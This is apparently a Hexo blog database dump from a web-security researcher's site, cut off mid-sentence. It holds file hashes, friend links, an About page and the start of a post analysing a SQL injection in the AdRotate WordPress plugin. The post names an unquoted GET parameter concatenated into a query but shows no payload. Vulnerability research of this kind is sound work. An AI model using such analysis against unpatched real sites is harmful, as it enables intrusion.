hives/2020/10/index.html","hash":"f0cfda079e27f6346699fc6f64ff26e883294325","modified":1608604527552},{"_id":"public/categories/技术/index.html","hash":"bc13946851a887931de6cddcdbae1b08d906ab39","modified":1608604527552},{"_id":"public/categories/技术/page/2/index.html","hash":"be68f179081e9d0123448dacbcf9c60502464489","modified":1608604527552},{"_id":"public/categories/技术/page/3/index.html","hash":"f431a92f75aa51cf626f918a3c5947883066d734","modified":1608604527552},{"_id":"public/categories/技术/page/4/index.html","hash":"e39b129f4090901999a38b6e3d8823dd15eb317e","modified":1608604527552},{"_id":"public/categories/技术/page/5/index.html","hash":"b811dfa37017fc51b0997aea6dc09fff61bf36de","modified":1608604527552},{"_id":"public/categories/技术/page/6/index.html","hash":"67be8461c774a28153ad9372bc54234311e1e3f3","modified":1608604527552},{"_id":"public/categories/技术/page/7/index.html","hash":"d9ce044e78587f2e4739d06546b14d434075071f","modified":1608604527552},{"_id":"public/categories/日常/index.html","hash":"a0adc175217a4e3fd4ea4b624fbb619d500575c1","modified":1608604527552},{"_id":"public/index.html","hash":"045b3660b7338c498537bfec2e14b0f09b4375d4","modified":1608604527552},{"_id":"public/page/2/index.html","hash":"61e6ecee067052e9e107ac26264ef055cf0453fb","modified":1608604527552},{"_id":"public/page/3/index.html","hash":"69943e859704897dbac2d1397404c77ff3fa675d","modified":1608604527552},{"_id":"public/page/4/index.html","hash":"e06bd75a261d1c179b3e7b73c17c7e827be8386a","modified":1608604527552},{"_id":"public/page/5/index.html","hash":"0bf8d55547317b425f073cd5f596ff103bebecb2","modified":1608604527552},{"_id":"public/page/6/index.html","hash":"a0483185b3a0a670130849c7e2c3a25dd8b9fd69","modified":1608604527552},{"_id":"public/page/7/index.html","hash":"3f0677ce54f54829dc5e8296abd3ac73587b3dd9","modified":1608604527552},{"_id":"public/page/8/index.html","hash":"fa0b0d53a0629d6cc60efdf38dddc5d8ede5d7b4","modified":1608604527552},{"_id":"public/tags/web漏洞分析/index.html","hash":"cc63bb03bb8f8b913950fb9c4d0bf38a1464d876","modified":1608604527552},{"_id":"public/tags/web漏洞分析/page/2/index.html","hash":"ef53fe9d7f626022f90a2dcb50c89b028c317377","modified":1608604527552},{"_id":"public/tags/web漏洞分析/page/3/index.html","hash":"e1b1441a00da0941da3dd47a480b4ea37055b803","modified":1608604527552},{"_id":"public/tags/web漏洞分析/page/4/index.html","hash":"019f734cc2a7c3aef4ff1f033575e6b2554d89ba","modified":1608604527552},{"_id":"public/tags/web漏洞分析/page/5/index.html","hash":"a0544d0c25a5767b32365ff5ea9204266a6a2763","modified":1608604527552},{"_id":"public/tags/web漏洞分析/page/6/index.html","hash":"0006ac34ee5a03e0bc476161131195326c02ccb5","modified":1608604527552},{"_id":"public/tags/杂文/index.html","hash":"3819dbb5078755a54ca6727a42773fccea00ccfb","modified":1608604527552},{"_id":"public/tags/java/index.html","hash":"3e1c9981c6935e031d5ed3a9ce19e7c2b85e5392","modified":1608604527552},{"_id":"public/tags/ctf/index.html","hash":"366aa235478d4658feafd682effa250b870147bc","modified":1608604527552},{"_id":"public/tags/翻译/index.html","hash":"a66743deea71098b3ac6590132091c0a180d7945","modified":1608604527552},{"_id":"public/tags/漏洞分析/index.html","hash":"ea8347686a1bc821308e793ca208540a4dcb13d5","modified":1608604527552},{"_id":"public/tags/技术分享/index.html","hash":"a074063f4ff1e679c6716eb4645a7cfe90bd8707","modified":1608604527552},{"_id":"public/tags/windows漏洞分析/index.html","hash":"b66f05c5cf6f0d182951c0a338a0748ba2cfe805","modified":1608604527552},{"_id":"public/robots.txt","hash":"a9dd1e5708155510a0f83feed52f5aff10161f93","modified":1603786366042},{"_id":"public/images/avatar.jpg","hash":"625ef30fcb8890b9955bd07346ce1c8081cf47a9","modified":1603786366042},{"_id":"public/about/index/example_qr.png","hash":"cce20432c34875f4d9c6df927ede0fc0f00bb194","modified":1603786366042},{"_id":"public/img/404.jpg","hash":"fb4489bc1d30c93d28f7332158c1c6c1416148de","modified":1603786366042},{"_id":"public/img/avatar.ico","hash":"6d9446180107ee43558121e090631d906d0d1929","modified":1603786366042},{"_id":"public/img/algolia.svg","hash":"ec119560b382b2624e00144ae01c137186e91621","modified":1603786366042},{"_id":"public/img/example_qr.png","hash":"cce20432c34875f4d9c6df927ede0fc0f00bb194","modified":1603786366042},{"_id":"public/img/favicon.png","hash":"3cf89864b4f6c9b532522a4d260a2e887971c92d","modified":1603786366042},{"_id":"public/img/icp.png","hash":"cb1fd69b38ec23ce8366668ddffbbd0160de0104","modified":1603786366042},{"_id":"public/img/loading.gif","hash":"5f0287fb8fb98872fe1998c6f781111819e71806","modified":1603786366042},{"_id":"public/Hello-World-0/helloworld.jpeg","hash":"419dede67985440a37fa1206e660e6a189b5cce6","modified":1603786366042},{"_id":"public/Webmin-RCE/1.jpg","hash":"97454a50e3458cd5304d936e6a04747c3e44b19b","modified":1603786366042},{"_id":"public/diango/0.jpg","hash":"886de59150245ff0c3a670306546ad6aa6fa0172","modified":1603786366042},{"_id":"public/diango/1.jpg","hash":"941f757db5964b200793a9cc3511b41f2c82a677","modified":1603786366042},{"_id":"public/diango/2.jpg","hash":"b7227daa2e7f2930f2e31cbd48185b9bc135b20f","modified":1603786366042},{"_id":"public/diango/4.jpg","hash":"e92889b20b84a62d9c8a05bc41b4f2ce36051063","modified":1603786366042},{"_id":"public/diango/5.jpg","hash":"953b3988a50312705e744005076ec062e81be863","modified":1603786366042},{"_id":"public/diango/6.jpg","hash":"864ce9994c17313fd57bf66c156e7d79063949a1","modified":1603786366042},{"_id":"public/hexohelp/0.jpeg","hash":"50504c8d166937a2fcaecbad4c88371778f4e57c","modified":1603786366042},{"_id":"public/kris/5.jpg","hash":"b35754a09db269bea8bb8d566cc0d8e81bea7a94","modified":1603786366042},{"_id":"public/ukiyoe/3.jpeg","hash":"86c44a07f6b1610d9505784fe96f1b8a0b1234da","modified":1603786366042},{"_id":"public/assets/algolia/algoliasearchLite.min.js","hash":"5bfb8b04f24fef2cd78c0706295f4ccbe4e5f063","modified":1603786366042},{"_id":"public/img/avatar.jpg","hash":"ae281249bcd8ca4d52b772ce5e5662cb6d7e643d","modified":1603786366042},{"_id":"public/img/friend_404.gif","hash":"8d2d0ebef70a8eb07329f57e645889b0e420fa48","modified":1603786366042},{"_id":"public/hexohelp/2.png","hash":"2eac2ae1fe1c8e477af477c520243999c13bfba5","modified":1603786366042},{"_id":"public/kris/0.jpg","hash":"14ed47508a92efb6c865b72a88436b376657e4f4","modified":1603786366042},{"_id":"public/hexohelp/3.png","hash":"95d46f1154f2daa6fa23e8342590c86e9e4f97ad","modified":1603786366042},{"_id":"public/kris/8.jpg","hash":"8e72bd41a4dddd1672490e31be03a433a4a80854","modified":1603786366042},{"_id":"public/ukiyoe/1.jpeg","hash":"b059121b83019ce3a074d22fa3b449dfaad798f9","modified":1603786366042},{"_id":"public/ukiyoe/2.jpg","hash":"46de83fa5a712ca06a50af2b1b4f7c35f0315db9","modified":1603786366042},{"_id":"public/ukiyoe/4.jpg","hash":"f63d3fb821004b1a788cde140504585dc6cda6de","modified":1603786366042},{"_id":"public/assets/algolia/algoliasearch.min.js","hash":"10c0238daacaf14343dca3df9eb37fc43014cb0c","modified":1603786366042},{"_id":"public/assets/algolia/algoliasearchLite.js","hash":"fdffc6c031f12719a751e13275ca8945d79d80b9","modified":1603786366042},{"_id":"public/kris/10.jpg","hash":"0c04b1737ecad67de97f5510d9fccca0bac4373e","modified":1603786366042},{"_id":"public/kris/3.jpg","hash":"7378eefe56af50bf22fd76948f07c1576dccc0f5","modified":1603786366042},{"_id":"public/js/third-party/activate-power-mode.js","hash":"2c4ab494225b7d04eed934efc43a43791e596f4a","modified":1603786366042},{"_id":"public/js/third-party/ClickShowText.js","hash":"32864aee35b5d739a36702b8d916b17bac52b17e","modified":1603786366042},{"_id":"public/js/third-party/click_heart.js","hash":"004ea645ed8c5e354711b5fc0dbfe015e181916b","modified":1603786366042},{"_id":"public/js/third-party/canvas-nest.js","hash":"38cb4f2b025f6354124dadb69fe0e0ce57d35094","modified":1603786366042},{"_id":"public/js/third-party/canvas-ribbon.js","hash":"1ddf4f6896175e77518f0fbd45776132b2954fb6","modified":1603786366042},{"_id":"public/js/third-party/fireworks.js","hash":"a048478f020a5a5b4781dd7b4946e9bfe30d7560","modified":1603786366042},{"_id":"public/js/search/local-search.js","hash":"591c1a91601287ab6d21e90bebf697792c785c10","modified":1603786366042},{"_id":"public/js/third-party/piao.js","hash":"8846788202ee4ad18a814fa492ac39bb7f09548a","modified":1603786366042},{"_id":"public/js/utils.js","hash":"f24426cd3c20057ecf46a872f748bece3fb9653a","modified":1603786366042},{"_id":"public/js/search/algolia.js","hash":"99bc7ef172e9af332d652e92c5ec8b9ec1481434","modified":1603786366042},{"_id":"public/diango/3.jpg","hash":"22915b5ed1c2f3b9fd4f26d0bed575d047750a12","modified":1603786366042},{"_id":"public/kris/11.jpg","hash":"386a585aeb483e0a26835924e58ebe93549df9b5","modified":1603786366042},{"_id":"public/kris/2.jpg","hash":"7e1bae4d9803bc540e400bec5760683deae289b3","modified":1603786366042},{"_id":"public/kris/4.jpg","hash":"779d636e11de09077e34c10eacc9b594092593a8","modified":1603786366042},{"_id":"public/kris/9.jpg","hash":"19143665e641c074031c22b752b13bb2351a9079","modified":1603786366042},{"_id":"public/kris/7.jpg","hash":"7e0200ec63c12df4b953a1000a797adc8a7453c8","modified":1603786366042},{"_id":"public/ukiyoe/0.jpg","hash":"3d657827bd2e69a0ca143a7ed124d9cd1c2af7de","modified":1603786366042},{"_id":"public/css/var.css","hash":"b901f564f4a3e387c9216838693a82d22d9c3391","modified":1603786366042},{"_id":"public/css/index.css","hash":"45dd8ff8f8c4e3f8e9d43220fa87c88de97f7dd5","modified":1603786366042},{"_id":"public/js/main.js","hash":"0ceecde17a68d06a595b8d9e1ee9a3602eb2521f","modified":1603786366042},{"_id":"public/js/tw_cn.js","hash":"2eafc44f4a5b24bef836b00dfc4360a84edb8dcc","modified":1603786366042},{"_id":"public/img/about-bg.jpg","hash":"ab388276822417cc4e703312c14e20280ec783b3","modified":1603786366042},{"_id":"public/img/site-head.jpg","hash":"7bdbde36a4562798f0de3e82211b4fe454a18944","modified":1603786366042},{"_id":"public/assets/algolia/algoliasearch.js","hash":"ce84a628eb56d60d8410fc6df54cfd54101f58bc","modified":1603786366042},{"_id":"public/img/site-head1.jpg","hash":"ba71526b6736f011c024bb4461416e5cf02c02d1","modified":1603786366042},{"_id":"public/kris/1.jpg","hash":"39f0a611e54039da42f2814bee40f8215338c3b6","modified":1603786366042},{"_id":"public/hexohelp/1.png","hash":"4d6662531e1cf010bbddf99768476ada745d1188","modified":1603786366042},{"_id":"public/images/analysis.png","hash":"3887ae7680db2ea8330d642c19f4e08c47acb4d6","modified":1603786366042},{"_id":"public/kris/6.jpg","hash":"826b7306b3145ad4f7033eba8e22698d85226fda","modified":1603786366042},{"_id":"public/img/123.jpg","hash":"34b60d19a7d6d1f50f4cbbe60686e708af259bc9","modified":1603786366042},{"_id":"source/_posts/CVE-2020-14882.md","hash":"34fbc53085f5ffedb6c624ed41f7c360d6bcf230","modified":1604050176520},{"_id":"public/CVE-2020-14882/index.html","hash":"5b4bf5fd8992122a14c779a5d5b77fffbe190661","modified":1608604527552},{"_id":"source/_posts/cve-2020-14882-analysis.md","hash":"34b884993731cc69011431bb5ba76a95eefe96c8","modified":1604307831085},{"_id":"public/cve-2020-14882-analysis/index.html","hash":"74249d6acc150d4f0f76645c0de973eefb184694","modified":1608604527552},{"_id":"public/archives/2020/page/3/index.html","hash":"9ac41e7138ebd823fa1720d131d6f175e2e87ede","modified":1608604527552},{"_id":"public/archives/2020/11/index.html","hash":"125beacd8c4ee58a982d5c40800b599ad858d7a1","modified":1608604527552},{"_id":"public/tags/web漏洞分析/page/7/index.html","hash":"20e4f69f7ba8014517dc3225c4e0b6b2a4d3a4bc","modified":1608604527552},{"_id":"source/_posts/74cmsrce.md","hash":"f0192c05246faae19181298607130eb3be6c1835","modified":1606978196766},{"_id":"public/74cmsrce/index.html","hash":"c4d9c6eff07e68880811ca98b62b62d76d12beb0","modified":1608604527552},{"_id":"public/archives/2020/12/index.html","hash":"96440dcde22afd704356195e520ff7b0217a8c53","modified":1608604527552},{"_id":"source/_posts/xstream.md","hash":"96dbbe4fec598eccc76064f53b5e92eaf67ecbd7","modified":1608604506662},{"_id":"public/xstream/index.html","hash":"1076b5b1733ff8742e94d2855adc42cd3ea55191","modified":1608604527552}],"Category":[{"name":"技术","_id":"ckgrozu7x0004wsa930t55zcw"},{"name":"日常","_id":"ckgrozu85000cwsa9cbviat5s"}],"Data":[{"_id":"link","data":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}],"Page":[{"layout":"false","sitemap":false,"_content":"iTpjHARw1a\n\n","source":"baidu_verify_iTpjHARw1a.html","raw":"layout: false\nsitemap: false\n---\niTpjHARw1a\n\n","date":"2019-09-24T07:15:15.126Z","updated":"2019-09-24T07:15:15.126Z","path":"baidu_verify_iTpjHARw1a.html","title":"","comments":1,"_id":"ckgrozu7d0000wsa9ecoh4myx","content":"iTpjHARw1a\n\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2017/02/勒索软件Ransomware防御领域.jpg","excerpt":"","more":"iTpjHARw1a\n\n"},{"layout":"404","title":"[404]","description":"May the Force be with you :&#41;","_content":"","source":"404.md","raw":"---\nlayout: 404\ntitle: \"[404]\"\ndescription: \"May the Force be with you :&#41;\"\n---\n","date":"2019-09-25T08:14:27.715Z","updated":"2019-09-25T08:14:27.715Z","path":"404.html","comments":1,"_id":"ckgrozu7t0002wsa9eaaa4290","content":"","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2016/12/机器学习算法2.jpg","excerpt":"","more":""},{"layout":"false","sitemap":false,"_content":"google-site-verification: google079cab7937988898.html\n","source":"google079cab7937988898.html","raw":"layout: false\nsitemap: false\n---\ngoogle-site-verification: google079cab7937988898.html\n","date":"2019-09-24T07:15:15.143Z","updated":"2019-09-24T07:15:15.143Z","path":"google079cab7937988898.html","title":"","comments":1,"_id":"ckgrozu810006wsa9foiycumr","content":"google-site-verification: google079cab7937988898.html\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2018/10/security-1011.png","excerpt":"","more":"google-site-verification: google079cab7937988898.html\n"},{"title":"About.Me","layout":"about","type":"about","top_img":"http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg","date":"2017-05-17T16:17:31.000Z","_content":"\n# About.Me\n\n\n\n原绿盟『伏影实验室』 Web安全研究员\n\n现天融信『阿尔法实验室』 Web高级安全研究员\n\n熊本熊，本熊是也！\n\n\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/09/timg.gif)\n\n\n","source":"about/index.md","raw":"---\ntitle: About.Me\nlayout: about\ntype: \"about\"\ntop_img: http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg\ndate: 2017-05-18 00:17:31\n---\n\n# About.Me\n\n\n\n原绿盟『伏影实验室』 Web安全研究员\n\n现天融信『阿尔法实验室』 Web高级安全研究员\n\n熊本熊，本熊是也！\n\n\n\n![](http://blog.nsfocus.net/wp-content/uploads/2019/09/timg.gif)\n\n\n","updated":"2020-09-10T09:29:31.955Z","path":"about/index.html","comments":1,"_id":"ckgrozu830008wsa9c2unccag","content":"<h1 id=\"About-Me\"><a href=\"#About-Me\" class=\"headerlink\" title=\"About.Me\"></a>About.Me</h1><p>原绿盟『伏影实验室』 Web安全研究员</p>\n<p>现天融信『阿尔法实验室』 Web高级安全研究员</p>\n<p>熊本熊，本熊是也！</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/09/timg.gif\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2020/05/hacker-0509-scaled.jpg","excerpt":"","more":"<h1 id=\"About-Me\"><a href=\"#About-Me\" class=\"headerlink\" title=\"About.Me\"></a>About.Me</h1><p>原绿盟『伏影实验室』 Web安全研究员</p>\n<p>现天融信『阿尔法实验室』 Web高级安全研究员</p>\n<p>熊本熊，本熊是也！</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/09/timg.gif\"></p>\n"},{"title":"分类","date":"2020-09-09T09:20:23.000Z","type":"categories","top_img":"http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg","_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2020-09-09 17:20:23\ntype: \"categories\"\ntop_img: http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg\n---\n","updated":"2020-09-10T02:37:56.603Z","path":"categories/index.html","comments":1,"layout":"page","_id":"ckgrozu84000awsa9cb8t24u6","content":"","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2016/05/%E6%8B%96%E5%BA%931.jpg","excerpt":"","more":""},{"title":"友情链接","date":"2020-09-10T02:21:56.000Z","type":"link","top_img":"http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg","_content":"\n\n## 友链交换\n\n>  想要交换友链的小伙伴，欢迎在留言板留言，留言格式：\n>  \n> - 站点链接：https://kumamon.fun\n> - 站点标题：熊本熊本熊's Studio.\n> - LOGO图标：https://kumamon.fun/img/avatar.jpg\n> \n> 本博客只交换同类型博客友链，欢迎各位小伙伴前来交换！\n\n","source":"link/index.md","raw":"---\ntitle: 友情链接\ndate: 2020-09-10 10:21:56\ntype: \"link\"\ntop_img: http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg\n---\n\n\n## 友链交换\n\n>  想要交换友链的小伙伴，欢迎在留言板留言，留言格式：\n>  \n> - 站点链接：https://kumamon.fun\n> - 站点标题：熊本熊本熊's Studio.\n> - LOGO图标：https://kumamon.fun/img/avatar.jpg\n> \n> 本博客只交换同类型博客友链，欢迎各位小伙伴前来交换！\n\n","updated":"2020-09-16T07:30:06.889Z","path":"link/index.html","comments":1,"layout":"page","_id":"ckgrozu87000fwsa94fbf27u3","content":"<h2 id=\"友链交换\"><a href=\"#友链交换\" class=\"headerlink\" title=\"友链交换\"></a>友链交换</h2><blockquote>\n<p> 想要交换友链的小伙伴，欢迎在留言板留言，留言格式：</p>\n<ul>\n<li>站点链接：<a href=\"https://kumamon.fun/\">https://kumamon.fun</a></li>\n<li>站点标题：熊本熊本熊’s Studio.</li>\n<li>LOGO图标：<a href=\"https://kumamon.fun/img/avatar.jpg\">https://kumamon.fun/img/avatar.jpg</a></li>\n</ul>\n<p>本博客只交换同类型博客友链，欢迎各位小伙伴前来交换！</p>\n</blockquote>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2016/05/%E6%8B%96%E5%BA%931.jpg","excerpt":"","more":"<h2 id=\"友链交换\"><a href=\"#友链交换\" class=\"headerlink\" title=\"友链交换\"></a>友链交换</h2><blockquote>\n<p> 想要交换友链的小伙伴，欢迎在留言板留言，留言格式：</p>\n<ul>\n<li>站点链接：<a href=\"https://kumamon.fun/\">https://kumamon.fun</a></li>\n<li>站点标题：熊本熊本熊’s Studio.</li>\n<li>LOGO图标：<a href=\"https://kumamon.fun/img/avatar.jpg\">https://kumamon.fun/img/avatar.jpg</a></li>\n</ul>\n<p>本博客只交换同类型博客友链，欢迎各位小伙伴前来交换！</p>\n</blockquote>\n"},{"title":"标签","date":"2020-09-09T09:19:46.000Z","type":"tags","top_img":"http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg","_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2020-09-09 17:19:46\ntype: \"tags\"\ntop_img: http://blog.nsfocus.net/wp-content/uploads/2020/09/php.jpg\n---\n","updated":"2020-09-10T02:38:19.840Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckgrozu89000iwsa9e73tdzac","content":"","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2016/12/机器学习算法2.jpg","excerpt":"","more":""}],"Post":[{"title":"从一个简单的wordpress插件漏洞研究一下wordpress插件原理","date":"2019-09-15T06:27:41.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n在AdRotate Plugin5.2以及5.2之前的版本中，存在一处sql注入漏洞，该漏洞为FortiGuard实验室发现\n\n<!--more-->\n\n漏洞位于AdRotate Plugin的\\dashboard\\publisher\\adverts-edit.php\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134445-1848c74e-d38e-1.png)\n可见上图中，存在着多出sql查询语句\n\n但是位于25行处，明显可见存在sql注入隐患\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134456-1eb7e6e6-d38e-1.png)\n位于上图红框处，在拼接sql语句时，$ad_edit_id变量被拼接在id值部分。但是在这里，并没有用单引号将其值闭合\n\n$ad_edit_id变量值可以通过get请求的方式传入，如下图\n\n![](https://xzfile.aliyuncs.com/media/upload/picture/20190910134513-28cd777c-d38e-1.png)\n\n位于上图173行，可见$ad_edit_id = 